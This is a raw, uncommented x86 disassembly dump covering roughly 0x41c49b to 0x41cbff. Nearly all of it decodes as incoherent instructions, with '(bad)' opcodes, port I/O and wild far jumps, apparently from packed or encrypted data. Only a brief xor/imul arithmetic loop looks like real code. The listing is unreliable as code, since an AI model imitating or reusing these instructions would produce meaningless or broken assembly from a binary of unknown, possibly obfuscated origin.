  41c49b:	jnp    0x41c4ac
  41c49d:	push   eax
  41c49e:	jmp    0xcaed7b43
  41c4a3:	popf   
  41c4a4:	bound  ebp,QWORD PTR [eax+ebp*1]
  41c4a7:	jg     0x41c43f
  41c4a9:	xlat   BYTE PTR ds:[ebx]
  41c4aa:	jo     0x41c4d8
  41c4ac:	push   esi
  41c4ad:	mov    bl,0x9e
  41c4af:	mov    al,ds:0x3a6bd6ac
  41c4b4:	in     al,0x5a
  41c4b6:	pop    es
  41c4b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c4b8:	ds push eax
  41c4ba:	ret    
  41c4bb:	push   0xffffffb8
  41c4bd:	jmp    0x5e48:0x6b1e05fb
  41c4c4:	push   es
  41c4c5:	jb     0x41c461
  41c4c7:	imul   ecx,DWORD PTR ds:0x993d,0x7cc8a7a3
  41c4d0:	arpl   WORD PTR [edi-0x7c75964b],bp
  41c4d6:	sub    DWORD PTR [edi-0x53dea14b],ebx
  41c4dc:	inc    ecx
  41c4dd:	pop    ebx
  41c4de:	mov    eax,ecx
  41c4e0:	lea    esp,[ebp+eiz*8-0x26f73279]
  41c4e7:	jnp    0x41c528
  41c4e9:	dec    edi
  41c4ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c4eb:	ret    
  41c4ec:	aaa    
  41c4ed:	push   ss
  41c4ee:	fwait
  41c4ef:	sub    al,0xe0
  41c4f1:	mul    BYTE PTR [eax-0x4a]
  41c4f4:	(bad)  
  41c4f5:	mov    ds:0x192f035c,al
  41c4fa:	jge    0x41c47c
  41c4fc:	mov    si,0x1b
  41c500:	and    edx,DWORD PTR [ebp+ebx*4+0x21]
  41c504:	loopne 0x41c4b9
  41c506:	aaa    
  41c507:	cmp    esp,ebx
  41c509:	aam    0x1a
  41c50b:	icebp  
  41c50c:	jb     0x41c54b
  41c50e:	rol    DWORD PTR [eax+ebp*4-0x22],0xb7
  41c513:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  41c515:	fiadd  WORD PTR [ebp-0xa8215f0]
  41c51b:	jp     0x41c58c
  41c51d:	ins    BYTE PTR es:[edi],dx
  41c51e:	fstp   st(7)
  41c520:	or     ah,0x28
  41c523:	in     eax,0x91
  41c525:	add    BYTE PTR [esi-0x63],0x7b
  41c529:	push   es
  41c52a:	outs   dx,BYTE PTR ds:[esi]
  41c52b:	jne    0x41c50d
  41c52d:	xchg   esi,eax
  41c52e:	cmc    
  41c52f:	fstp   TBYTE PTR [ebx]
  41c531:	push   ds
  41c532:	mov    WORD PTR [edi-0x3d],fs
  41c535:	pop    edx
  41c536:	xchg   edi,eax
  41c537:	xor    dl,BYTE PTR ds:0xaa5fec26
  41c53d:	loopne 0x41c4ee
  41c53f:	xchg   BYTE PTR [ebp+edi*1+0x62188c28],ch
  41c546:	cmp    al,0x3d
  41c548:	push   es
  41c549:	sbb    eax,0x3db3f4c3
  41c54e:	sub    bl,BYTE PTR [ebx-0x1f047fa5]
  41c554:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c555:	clc    
  41c556:	ret    0xba76
  41c559:	xchg   edi,eax
  41c55a:	into   
  41c55b:	mov    dl,0x93
  41c55d:	out    dx,eax
  41c55e:	(bad)  
  41c55f:	das    
  41c560:	stos   BYTE PTR es:[edi],al
  41c561:	sub    al,0x22
  41c563:	mov    DWORD PTR [edx-0xd],edx
  41c566:	push   es
  41c567:	lahf   
  41c568:	mov    ebx,ebx
  41c56a:	pushf  
  41c56b:	mov    bh,0x85
  41c56d:	in     eax,0x15
  41c56f:	xchg   ebp,eax
  41c570:	cmp    ah,BYTE PTR [ebp-0x7b]
  41c573:	loop   0x41c5ae
  41c575:	sbb    al,0xe2
  41c577:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c578:	dec    esp
  41c579:	xor    cl,BYTE PTR [edi]
  41c57b:	dec    edx
  41c57c:	dec    ecx
  41c57d:	test   ebp,edi
  41c57f:	test   al,0x84
  41c581:	add    BYTE PTR [esi-0x2fcc37cd],0x2b
  41c588:	retf   0xce2b
  41c58b:	xor    ecx,eax
  41c58d:	mov    DWORD PTR [ebp+0x8],ecx
  41c590:	mov    ecx,DWORD PTR [ebp+0x8]
  41c593:	mov    edx,DWORD PTR [ebp+0x8]
  41c596:	xor    ecx,eax
  41c598:	imul   edx,edx,0x5708f2
  41c59e:	add    ecx,esi
  41c5a0:	lea    ecx,[ebp+ecx*4-0x64]
  41c5a4:	mov    edi,DWORD PTR [ecx]
  41c5a6:	add    edx,edi
  41c5a8:	mov    DWORD PTR [ecx],edx
  41c5aa:	mov    ecx,DWORD PTR [ebp+0x8]
  41c5ad:	xor    ecx,eax
  41c5af:	add    ecx,esi
  41c5b1:	jne    0x41a1f0
  41c5b7:	mov    ecx,DWORD PTR [ebp-0x14]
  41c5ba:	mov    edx,DWORD PTR [ebp+0x8]
  41c5bd:	xor    ecx,eax
  41c5bf:	jmp    0x41e94c
  41c5c4:	js     0x41c5e5
  41c5c6:	pop    ebx
  41c5c7:	out    0xdb,eax
  41c5c9:	jnp    0x41c643
  41c5cb:	rep ins DWORD PTR es:[edi],dx
  41c5cd:	pop    ebx
  41c5ce:	jns    0x41c591
  41c5d0:	push   esi
  41c5d1:	jge    0x41c5fb
  41c5d3:	xchg   esp,eax
  41c5d4:	(bad)  
  41c5d5:	loope  0x41c654
  41c5d7:	jp     0x41c5e3
  41c5d9:	pop    edi
  41c5da:	jp     0x41c656
  41c5dc:	xor    eax,0x20300c47
  41c5e1:	mov    ch,0xb9
  41c5e3:	frstor [ecx-0x59423832]
  41c5e9:	push   0xfffffffe
  41c5eb:	mov    ebx,0xf070d9f2
  41c5f0:	out    dx,al
  41c5f1:	and    DWORD PTR [ecx+eiz*2],esi
  41c5f4:	mov    eax,ds:0xcab84dde
  41c5f9:	clc    
  41c5fa:	cmp    al,0x82
  41c5fc:	daa    
  41c5fd:	sbb    BYTE PTR [eax-0x4],0x6d
  41c601:	xchg   ebp,eax
  41c602:	push   ebx
  41c603:	clc    
  41c604:	in     eax,dx
  41c605:	inc    ecx
  41c606:	xor    al,0xf3
  41c608:	cmc    
  41c609:	ss out dx,eax
  41c60b:	outs   dx,BYTE PTR ds:[esi]
  41c60c:	imul   DWORD PTR [edx+0x57bd0e89]
  41c612:	je     0x41c5c5
  41c614:	inc    esp
  41c615:	sub    eax,0x2b54894c
  41c61a:	or     eax,0x1d387f0d
  41c61f:	fbstp  TBYTE PTR [edi+ebx*4+0x72c899df]
  41c626:	(bad)  
  41c627:	std    
  41c628:	hlt    
  41c629:	add    eax,0x8d0dbef2
  41c62e:	jbe    0x41c5ff
  41c630:	or     eax,0x49e58a3d
  41c635:	jb     0x41c641
  41c637:	inc    edx
  41c638:	cmc    
  41c639:	cli    
  41c63a:	imul   ebp,edx,0xe5a8d654
  41c640:	mov    al,0x92
  41c642:	push   edx
  41c643:	mov    ecx,0x19b056c7
  41c648:	inc    ebp
  41c649:	jmp    0xab9cb273
  41c64e:	push   esp
  41c64f:	push   esp
  41c650:	out    dx,eax
  41c651:	lods   eax,DWORD PTR ds:[esi]
  41c652:	mov    ebx,0x92e5950c
  41c657:	(bad)  [ecx-0x6a4213da]
  41c65d:	adc    BYTE PTR [ecx-0x59],dl
  41c660:	mov    bh,0x5f
  41c662:	add    esi,ebx
  41c664:	push   cs
  41c665:	jmp    DWORD PTR [eax]
  41c667:	cwde   
  41c668:	xor    BYTE PTR [ecx],ch
  41c66a:	push   ds
  41c66b:	shl    cl,cl
  41c66d:	push   0xa75258f8
  41c672:	fistp  QWORD PTR [esi]
  41c674:	adc    BYTE PTR [ebx-0x36],bl
  41c677:	loope  0x41c61e
  41c679:	ins    DWORD PTR es:[edi],dx
  41c67a:	dec    esp
  41c67b:	or     eax,0x3ea26770
  41c680:	imul   edi,edx,0x4a
  41c683:	mov    BYTE PTR [edi-0x42],bh
  41c686:	out    0xa0,eax
  41c688:	jns    0x41c6ae
  41c68a:	lds    eax,FWORD PTR [eax-0x3b]
  41c68d:	inc    ebp
  41c68e:	mov    cl,0x82
  41c690:	and    dl,bh
  41c692:	jge    0x41c63d
  41c694:	add    eax,0x67be51f
  41c699:	js     0x41c629
  41c69b:	retf   0x7632
  41c69e:	jp     0x41c63a
  41c6a0:	lods   al,BYTE PTR ds:[esi]
  41c6a1:	fldenv [edx-0x45]
  41c6a4:	dec    esp
  41c6a5:	or     eax,0x59fc9548
  41c6aa:	sub    BYTE PTR [esp+eiz*2-0x378c8108],cl
  41c6b1:	mov    ds:0x2a38eeb2,eax
  41c6b6:	or     eax,0x5e9f729c
  41c6bb:	push   ss
  41c6bc:	push   ebx
  41c6bd:	jmp    0x41c728
  41c6bf:	je     0x41c6f1
  41c6c1:	ins    DWORD PTR es:[edi],dx
  41c6c2:	stos   DWORD PTR es:[edi],eax
  41c6c3:	hlt    
  41c6c4:	add    al,0x64
  41c6c6:	dec    eax
  41c6c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c6c8:	mov    bl,0xa0
  41c6ca:	scas   al,BYTE PTR es:[edi]
  41c6cb:	sub    eax,0x1a4d849a
  41c6d0:	in     al,0xb8
  41c6d2:	imul   esp,edi,0x3219888d
  41c6d8:	push   ss
  41c6d9:	imul   ecx,DWORD PTR [ebp+0x239ac8c1],0xffffffb6
  41c6e0:	mov    esi,0x986231d7
  41c6e5:	(bad)  
  41c6e6:	pop    eax
  41c6e7:	pop    edx
  41c6e8:	das    
  41c6e9:	add    ah,BYTE PTR [ecx]
  41c6eb:	sbb    BYTE PTR [ebp-0x3f],bl
  41c6ee:	test   al,0x8a
  41c6f0:	aaa    
  41c6f1:	fsubr  QWORD PTR [eax+0x4b]
  41c6f4:	inc    esi
  41c6f5:	jmp    0x41c6c0
  41c6f7:	dec    ecx
  41c6f8:	mov    eax,ebp
  41c6fa:	(bad)  [edi+0x47]
  41c6fd:	clc    
  41c6fe:	inc    edi
  41c6ff:	jae    0x41c6b5
  41c701:	sar    dl,1
  41c703:	adc    cl,BYTE PTR [eax+0x4b]
  41c706:	pop    esi
  41c707:	fs mov edx,0x379eea81
  41c70d:	pusha  
  41c70e:	and    al,0x7
  41c710:	rcl    BYTE PTR [esi-0x7b],0xf9
  41c714:	mov    ebx,0x391aa122
  41c719:	dec    BYTE PTR [esp+eax*4+0xb]
  41c71d:	fmul   st(3),st
  41c71f:	xchg   esi,eax
  41c720:	out    0x44,al
  41c722:	hlt    
  41c723:	sbb    eax,0x381d0ddb
  41c728:	sbb    ebp,DWORD PTR [ecx]
  41c72a:	pop    ds
  41c72b:	xchg   edx,eax
  41c72c:	js     0x41c700
  41c72e:	cmp    al,0x20
  41c730:	sbb    BYTE PTR [ecx-0x50],cl
  41c733:	fsub   st(1),st
  41c735:	xchg   edi,ebx
  41c737:	enter  0xf8a8,0x5b
  41c73b:	cmc    
  41c73c:	xor    DWORD PTR [esi-0x51858b78],edx
  41c742:	sbb    ah,BYTE PTR [ecx]
  41c744:	dec    edx
  41c745:	and    al,0x4
  41c747:	dec    ecx
  41c748:	inc    esp
  41c749:	(bad)  
  41c74b:	cs pop ebx
  41c74d:	arpl   WORD PTR [edx+0x44],bp
  41c750:	push   es
  41c751:	fs push ds
  41c753:	mov    dl,0x72
  41c755:	bound  edi,QWORD PTR [ecx-0x51]
  41c758:	clc    
  41c759:	mov    ?,ecx
  41c75b:	adc    dh,BYTE PTR [ebx-0x24b5892d]
  41c761:	shl    BYTE PTR [ecx+0x3844246e],cl
  41c767:	push   eax
  41c768:	add    DWORD PTR [edx-0x3882aa68],edx
  41c76e:	(bad)  
  41c76f:	mov    bl,0x52
  41c771:	jecxz  0x41c6f6
  41c773:	push   es
  41c774:	push   es
  41c775:	in     al,dx
  41c776:	cmp    al,0xae
  41c778:	dec    esi
  41c779:	mov    ebp,0xd7cc26f5
  41c77e:	adc    edx,edx
  41c780:	jg     0x41c7cd
  41c782:	enter  0x37db,0xb0
  41c786:	(bad)  
  41c788:	aaa    
  41c789:	push   edi
  41c78a:	les    eax,FWORD PTR [ebp+0x162713db]
  41c790:	loopne 0x41c738
  41c792:	push   cs
  41c793:	imul   esi,DWORD PTR [eiz*4-0x57c3f5cc],0x3a28771a
  41c79e:	fcomp  QWORD PTR [ebp-0x79]
  41c7a1:	js     0x41c786
  41c7a3:	(bad)  
  41c7a4:	jmp    0x4020:0xcb78bc79
  41c7ab:	mov    cl,0x42
  41c7ad:	or     ecx,ebp
  41c7af:	ins    DWORD PTR es:[edi],dx
  41c7b0:	ss jg  0x41c785
  41c7b3:	das    
  41c7b4:	and    BYTE PTR [edx-0x4f656170],dl
  41c7ba:	fistp  WORD PTR [edi+0x59]
  41c7bd:	jl     0x41c824
  41c7bf:	sub    bh,BYTE PTR [edx-0x4f]
  41c7c2:	cwde   
  41c7c3:	ret    0x5ce
  41c7c6:	jg     0x41c749
  41c7c8:	push   edx
  41c7c9:	sti    
  41c7ca:	inc    esi
  41c7cb:	call   0x736081ff
  41c7d0:	loope  0x41c7b4
  41c7d2:	xor    al,BYTE PTR ds:[ebx+0x76fa5c98]
  41c7d9:	mov    dh,0xa3
  41c7db:	test   DWORD PTR [esi-0x10],ebx
  41c7de:	retf   
  41c7df:	xor    BYTE PTR [edi],ah
  41c7e1:	dec    edi
  41c7e2:	or     esp,DWORD PTR [ebx]
  41c7e4:	pop    edi
  41c7e5:	sbb    esi,DWORD PTR [eax+0x54855028]
  41c7eb:	push   ecx
  41c7ec:	outs   dx,BYTE PTR ds:[esi]
  41c7ed:	inc    esp
  41c7ee:	mov    cl,0xf6
  41c7f0:	fmul   DWORD PTR [ebp-0x24]
  41c7f3:	shl    dl,1
  41c7f5:	ret    0xad01
  41c7f8:	pop    ds
  41c7f9:	adc    DWORD PTR [ebx-0x5a0d7d81],eax
  41c7ff:	inc    ebp
  41c800:	in     al,dx
  41c801:	inc    eax
  41c802:	xor    al,dl
  41c804:	or     ah,BYTE PTR [edx]
  41c806:	ret    0x2a78
  41c809:	xor    DWORD PTR [eax-0x53f3f283],edx
  41c80f:	mov    BYTE PTR [ebx],ch
  41c811:	(bad)  
  41c812:	pop    ebx
  41c813:	xor    DWORD PTR [edx+0x16],ebp
  41c816:	cmp    DWORD PTR [esi+0x6bf9202],edx
  41c81c:	loopne 0x41c834
  41c81e:	leave  
  41c81f:	mov    WORD PTR ds:0x29131b37,gs
  41c825:	gs sar ebp,cl
  41c828:	into   
  41c829:	clc    
  41c82a:	jae    0x41c824
  41c82c:	pop    ecx
  41c82d:	scas   al,BYTE PTR es:[edi]
  41c82e:	jmp    0x41c82c
  41c830:	dec    ebp
  41c831:	cmc    
  41c832:	xchg   dl,al
  41c834:	dec    edx
  41c835:	push   ecx
  41c836:	xor    DWORD PTR [edi-0x2c0eaed7],0x674a48c9
  41c840:	popa   
  41c841:	mov    bl,0x24
  41c843:	cld    
  41c844:	test   eax,0xee67d97a
  41c849:	jae    0x41c8c4
  41c84b:	je     0x41c86e
  41c84d:	sub    ebx,DWORD PTR [esp+ecx*4-0x4039b344]
  41c854:	xchg   edi,eax
  41c855:	sahf   
  41c856:	test   DWORD PTR [eax+ebp*4+0x6a450052],ecx
  41c85d:	jp     0x41c8cd
  41c85f:	pop    esi
  41c860:	inc    ebp
  41c861:	mov    dl,0x4
  41c863:	pop    edi
  41c864:	scas   al,BYTE PTR es:[edi]
  41c865:	dec    eax
  41c866:	xor    eax,0x412319ef
  41c86b:	adc    ebx,ebx
  41c86d:	ins    DWORD PTR es:[edi],dx
  41c86e:	mov    BYTE PTR fs:0xb14ac940,dh
  41c875:	fistp  DWORD PTR [edx-0x4b732539]
  41c87b:	cmp    al,0xc0
  41c87d:	(bad)  
  41c87e:	dec    ebp
  41c87f:	mov    edx,0x3b74c265
  41c884:	jecxz  0x41c8a4
  41c886:	retf   0x78fa
  41c889:	in     al,0xf9
  41c88b:	sub    DWORD PTR [ebp+eiz*2-0x28],ebx
  41c88f:	and    al,0x4c
  41c891:	jle    0x41c8a9
  41c893:	stos   BYTE PTR es:[edi],al
  41c894:	and    edx,esp
  41c896:	pop    ebp
  41c897:	sbb    ah,BYTE PTR [ebx]
  41c899:	out    0xe9,eax
  41c89b:	mov    esp,DWORD PTR [edi+0x6]
  41c89e:	push   cs
  41c89f:	repnz rol DWORD PTR [ecx-0x3f],0xcb
  41c8a4:	jns    0x41c90a
  41c8a6:	push   edx
  41c8a7:	mov    eax,ds:0x8cee0e9c
  41c8ac:	cs xor dh,ch
  41c8af:	dec    edi
  41c8b0:	dec    esp
  41c8b1:	cs ret 
  41c8b3:	sub    edi,DWORD PTR [ebx+ecx*2]
  41c8b6:	adc    al,0x4e
  41c8b8:	or     edx,DWORD PTR [ebx]
  41c8ba:	imul   ebx,DWORD PTR [edx],0x365f9231
  41c8c0:	push   esi
  41c8c1:	dec    ecx
  41c8c2:	pop    esi
  41c8c3:	xor    bl,BYTE PTR [ebx-0x41]
  41c8c6:	inc    edx
  41c8c7:	das    
  41c8c8:	bnd jbe 0x41c8fa
  41c8cb:	jmp    0x41c8fb
  41c8cd:	jle    0x41c8c5
  41c8cf:	pop    edx
  41c8d0:	jnp    0x41c93a
  41c8d2:	cmp    cl,BYTE PTR [edx+esi*4+0x5c]
  41c8d6:	jne    0x41c8d8
  41c8d8:	jle    0x41c8d7
  41c8da:	sbb    eax,0xc3274538
  41c8df:	(bad)
  41c8e2:	adc    eax,0x4dd47a3f
  41c8e7:	jp     0x41c92e
  41c8e9:	inc    esi
  41c8ea:	stos   DWORD PTR es:[edi],eax
  41c8eb:	mov    cl,BYTE PTR [bp+di-0x73]
  41c8ef:	cmp    BYTE PTR [edi-0x477ec268],cl
  41c8f5:	xchg   edx,eax
  41c8f6:	je     0x41c959
  41c8f8:	inc    edx
  41c8f9:	xor    BYTE PTR [ebx-0x1d],bh
  41c8fc:	shl    BYTE PTR [esi],cl
  41c8fe:	jbe    0x41c956
  41c900:	xchg   edi,eax
  41c901:	fwait
  41c902:	(bad)
  41c906:	dec    edi
  41c907:	inc    ebp
  41c908:	or     eax,0xb053049e
  41c90d:	sub    DWORD PTR [ebp+0x2a89639c],ebx
  41c913:	mov    al,0x56
  41c915:	fdivr  QWORD PTR [ecx]
  41c917:	push   0x70
  41c919:	inc    esi
  41c91a:	push   edi
  41c91b:	adc    al,0xa3
  41c91d:	push   esp
  41c91e:	ds pop esi
  41c920:	lock cmp al,dh
  41c923:	jecxz  0x41c933
  41c925:	mov    edx,0x51646020
  41c92a:	sub    eax,0xf1fc3161
  41c92f:	push   ebx
  41c930:	mov    eax,ds:0x6d8ab4a2
  41c935:	sahf   
  41c936:	cs inc eax
  41c938:	inc    edx
  41c939:	cdq    
  41c93a:	mov    ebx,0x474dec6e
  41c93f:	jge    0x41c999
  41c941:	rcr    DWORD PTR [ebp+0x7e05442b],0x8d
  41c948:	imul   eax,esi,0x2
  41c94b:	or     DWORD PTR [edi-0x2296a192],edx
  41c951:	mov    cl,0x41
  41c953:	fsub   st,st(0)
  41c955:	gs (bad) 
  41c958:	mov    cs,WORD PTR [ebp+ebx*4-0x2f0389f7]
  41c95f:	loop   0x41c981
  41c961:	lahf   
  41c962:	push   ebp
  41c963:	psubusb mm4,mm3
  41c966:	push   ds
  41c967:	jne    0x41c990
  41c969:	in     eax,dx
  41c96a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c96b:	sti    
  41c96c:	hlt    
  41c96d:	xor    edx,edi
  41c96f:	dec    ebx
  41c970:	pop    ebp
  41c971:	mov    eax,ds:0x61d55f71
  41c977:	es xor ebp,esp
  41c97a:	sbb    DWORD PTR [esi],esp
  41c97c:	sti    
  41c97d:	sbb    edx,DWORD PTR [edx+0x40180648]
  41c983:	in     al,0xe4
  41c985:	fwait
  41c986:	jb     0x41c913
  41c988:	fs popf 
  41c98a:	fnstenv [ebp+0x29]
  41c98d:	test   eax,0xb88e02f4
  41c992:	pop    esp
  41c993:	jmp    DWORD PTR [eax]
  41c995:	inc    cx
  41c997:	jecxz  0x41c98c
  41c999:	push   0x600e711
  41c99e:	test   eax,0xcecc164
  41c9a3:	ins    BYTE PTR es:[edi],dx
  41c9a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c9a5:	push   edi
  41c9a6:	xchg   esp,eax
  41c9a7:	jmp    0x41ca00
  41c9a9:	sbb    edi,eax
  41c9ab:	pop    edi
  41c9ac:	(bad)  
  41c9ad:	dec    esp
  41c9ae:	aas    
  41c9af:	inc    esi
  41c9b0:	ds xchg ebx,eax
  41c9b2:	jl     0x41c9f7
  41c9b4:	pop    ebp
  41c9b5:	or     cl,BYTE PTR [ebp-0x4032d0c5]
  41c9bb:	xchg   ebx,eax
  41c9bc:	loop   0x41c956
  41c9be:	sub    eax,0xf6ca6de1
  41c9c3:	cmp    DWORD PTR [edi-0x5],edx
  41c9c6:	or     ch,bl
  41c9c8:	cmc    
  41c9c9:	int    0x7d
  41c9cb:	jle    0x41c9c1
  41c9cd:	call   0x194c:0x9b879a39
  41c9d4:	ror    DWORD PTR [esi+0x8],1
  41c9d7:	sbb    cl,BYTE PTR [ebp+0x7]
  41c9da:	push   ebp
  41c9db:	add    eax,0x12cb69ab
  41c9e0:	dec    eax
  41c9e1:	xchg   ecx,eax
  41c9e2:	push   ecx
  41c9e3:	lahf   
  41c9e4:	jge    0x41c991
  41c9e6:	ret    0xda43
  41c9e9:	lods   eax,DWORD PTR ds:[esi]
  41c9ea:	sbb    bh,BYTE PTR [ebp-0x13]
  41c9ed:	jl     0x41c9ac
  41c9ef:	rcr    DWORD PTR [edx+0x5e14bed3],cl
  41c9f5:	cwde   
  41c9f6:	mov    dh,0xd6
  41c9f8:	mov    BYTE PTR ds:[esi-0x5d],bl
  41c9fc:	mov    ah,0xb5
  41c9fe:	jp     0x41ca03
  41ca00:	xor    edx,DWORD PTR [ebx+edi*8+0x68]
  41ca04:	cli    
  41ca05:	inc    eax
  41ca06:	enter  0x10c,0xf6
  41ca0a:	xchg   ebx,eax
  41ca0b:	imul   edx,DWORD PTR [eax+0x28],0xafeef0e
  41ca12:	ficom  WORD PTR [ebx]
  41ca14:	imul   esi,DWORD PTR [edx+0x4],0x43
  41ca18:	les    ebx,FWORD PTR [edi+0xa99052e]
  41ca1e:	call   0x6f85b233
  41ca23:	shl    DWORD PTR ds:0x462e135d,1
  41ca29:	in     eax,dx
  41ca2a:	and    eax,0xee436dd2
  41ca2f:	in     eax,dx
  41ca30:	pop    ss
  41ca31:	int    0x7d
  41ca33:	fwait
  41ca34:	lds    ecx,FWORD PTR [esi+0x1314a807]
  41ca3a:	jmp    0x9d33:0xdfa4d58c
  41ca41:	rcr    BYTE PTR [edx+0x61910ad1],cl
  41ca47:	arpl   ax,ax
  41ca49:	push   edi
  41ca4a:	int    0xb3
  41ca4c:	hlt    
  41ca4d:	add    DWORD PTR [ecx-0x64c426f1],esi
  41ca53:	add    al,0xdb
  41ca55:	sub    eax,0x1bb91c76
  41ca5a:	or     BYTE PTR [edx+0x2d3abc80],bh
  41ca60:	cld    
  41ca61:	pushf  
  41ca62:	or     BYTE PTR [ecx+0x7445ca8d],bh
  41ca68:	mov    ebx,0xdbd6d3ab
  41ca6d:	ins    DWORD PTR es:[edi],dx
  41ca6e:	addr16 js 0xcee1c92a
  41ca75:	jno    0x41cae0
  41ca77:	sbb    ebx,DWORD PTR [ebx-0xa]
  41ca7a:	dec    edi
  41ca7b:	es or  eax,0x50447e2e
  41ca81:	retf   
  41ca82:	addr16 xchg esi,eax
  41ca84:	pusha  
  41ca85:	pusha  
  41ca86:	jo     0x41cabc
  41ca88:	stos   BYTE PTR es:[edi],al
  41ca89:	daa    
  41ca8a:	out    0xfb,al
  41ca8c:	outs   dx,BYTE PTR ds:[esi]
  41ca8d:	int3   
  41ca8e:	dec    ebp
  41ca8f:	fisub  WORD PTR [edx]
  41ca91:	sub    eax,0xa3d3483
  41ca96:	jl     0x41cabd
  41ca98:	sub    al,0x80
  41ca9a:	jns    0x41ca5e
  41ca9c:	fwait
  41ca9d:	scas   al,BYTE PTR es:[edi]
  41ca9e:	loope  0x41cadb
  41caa0:	(bad)
  41caa3:	fst    DWORD PTR [esi-0x14]
  41caa6:	cmp    BYTE PTR [ebp-0x3a00baa1],al
  41caac:	or     eax,DWORD PTR [esi+0x245d1ed8]
  41cab2:	lods   eax,DWORD PTR ds:[esi]
  41cab3:	pusha  
  41cab4:	ins    BYTE PTR es:[edi],dx
  41cab5:	jne    0x41ca8c
  41cab7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cab8:	mov    ebp,0x23fe9ed7
  41cabd:	rcr    dl,1
  41cabf:	pushf  
  41cac0:	cmp    BYTE PTR [esi-0x69a4da45],bl
  41cac6:	push   es
  41cac7:	push   0x8e7ddc87
  41cacc:	aad    0xad
  41cace:	(bad)
  41cad1:	in     al,0xd6
  41cad3:	add    al,BYTE PTR [ebx+eiz*8-0x38]
  41cad7:	pop    esp
  41cad8:	sti    
  41cad9:	pusha  
  41cada:	into   
  41cadb:	fisub  WORD PTR [esi]
  41cadd:	out    0xc8,al
  41cadf:	loope  0x41caa2
  41cae1:	dec    edx
  41cae2:	mov    bl,0x37
  41cae4:	fisubr WORD PTR [edx]
  41cae6:	cwde   
  41cae7:	add    dl,BYTE PTR [ecx-0x10d11c6f]
  41caed:	cli    
  41caee:	ret    
  41caef:	push   edi
  41caf0:	sub    BYTE PTR [edi-0x236e454f],0xf8
  41caf7:	std    
  41caf8:	mov    eax,0x23588edc
  41cafd:	pop    ebp
  41cafe:	data16 jne 0x41ca93
  41cb01:	pusha  
  41cb02:	mov    ds:0xefb187ed,eax
  41cb07:	loopne 0x41ca92
  41cb09:	pushf  
  41cb0a:	dec    edi
  41cb0b:	loop   0x41cacd
  41cb0d:	pop    edi
  41cb0e:	icebp  
  41cb0f:	fld    st(0)
  41cb11:	cmp    BYTE PTR [esi],dh
  41cb13:	push   es
  41cb14:	cmp    al,0xe4
  41cb16:	mov    BYTE PTR [edx+0x462480b4],0xa1
  41cb1d:	pushf  
  41cb1e:	mov    ecx,0x11f14a30
  41cb23:	adc    DWORD PTR [ecx-0x34cb46f7],ecx
  41cb29:	pop    ecx
  41cb2a:	add    DWORD PTR [ecx-0xb],eax
  41cb2d:	out    0xa9,eax
  41cb2f:	push   edi
  41cb30:	aad    0x6e
  41cb32:	cmc    
  41cb33:	outs   dx,BYTE PTR ds:[esi]
  41cb34:	leave  
  41cb35:	jmp    0x3ae3c76a
  41cb3a:	(bad)  
  41cb3b:	cli    
  41cb3c:	xlat   BYTE PTR ds:[ebx]
  41cb3d:	leave  
  41cb3e:	pop    esi
  41cb40:	pop    ds
  41cb41:	fwait
  41cb42:	scas   eax,DWORD PTR es:[edi]
  41cb43:	xchg   ecx,eax
  41cb44:	sub    ebx,0x85d92d36
  41cb4a:	test   esi,ecx
  41cb4c:	mov    bl,0x47
  41cb4e:	mov    bl,0xd4
  41cb50:	xchg   ebx,ebx
  41cb52:	loopne 0x41cb7f
  41cb54:	xor    cl,ah
  41cb56:	mov    bl,0x4f
  41cb58:	(bad)  
  41cb59:	stc    
  41cb5a:	xor    ch,bl
  41cb5c:	xchg   edi,eax
  41cb5d:	cmp    cl,BYTE PTR [edx-0x7b]
  41cb60:	or     BYTE PTR [eax+edx*4-0x3e5d54a7],bh
  41cb67:	or     eax,0xb4e61d3d
  41cb6c:	fcom   DWORD PTR [edi-0x1cc9e675]
  41cb72:	aas    
  41cb73:	sub    al,0x21
  41cb75:	ret    
  41cb76:	sbb    eax,0x857883dd
  41cb7b:	jbe    0x41cb9d
  41cb7d:	test   BYTE PTR [ebp-0x73c0f4b7],0xb1
  41cb84:	rcr    BYTE PTR [ebp-0x74d3937a],0xfc
  41cb8b:	pop    edi
  41cb8c:	add    al,0xbe
  41cb8e:	ja     0x41cba4
  41cb90:	jl     0x41cb53
  41cb92:	pop    ds
  41cb93:	in     al,0xcf
  41cb95:	icebp  
  41cb96:	dec    ebp
  41cb97:	xchg   ecx,eax
  41cb98:	push   0x59
  41cb9a:	push   edi
  41cb9b:	lea    ecx,[ebx+0x13]
  41cb9e:	mov    ch,0xf0
  41cba0:	cmp    bh,BYTE PTR [esi-0x20]
  41cba3:	adc    eax,0x9570ebd8
  41cba8:	imul   ebp,DWORD PTR fs:[ecx-0x101fe6d5],0x1b
  41cbb0:	retf   0xc0ec
  41cbb3:	icebp  
  41cbb4:	fwait
  41cbb5:	inc    esi
  41cbb6:	sbb    DWORD PTR [ebp+0x59f3be18],edi
  41cbbc:	xor    DWORD PTR [edi+ebx*2],edx
  41cbbf:	sbb    eax,0xb4f4b464
  41cbc4:	push   edi
  41cbc5:	lea    ebx,ds:[eax+0x13a530e2]
  41cbcc:	lahf   
  41cbcd:	rol    eax,1
  41cbcf:	daa    
  41cbd0:	cmp    edi,ecx
  41cbd2:	pop    edx
  41cbd3:	xchg   DWORD PTR [ebx],ebx
  41cbd5:	jle    0x41cbf8
  41cbd7:	xchg   BYTE PTR [edi-0x7d637fc6],ch
  41cbdd:	mov    eax,0x4c83caf1
  41cbe2:	mov    ah,0xca
  41cbe4:	stos   DWORD PTR es:[edi],eax
  41cbe5:	inc    edi
  41cbe6:	jno    0x41cc4c
  41cbe8:	push   0xffffffaa
  41cbea:	jl     0x41cc00
  41cbec:	inc    esp
  41cbed:	scas   al,BYTE PTR es:[edi]
  41cbee:	ror    DWORD PTR [edi],0x6c
  41cbf1:	inc    ebx
  41cbf2:	fild   DWORD PTR [edi-0x54]
  41cbf5:	inc    edx
  41cbf6:	mov    eax,ds:0xbc0a2f40
  41cbfb:	rcr    DWORD PTR [ecx-0x39],0x5c
  41cbff:	nop
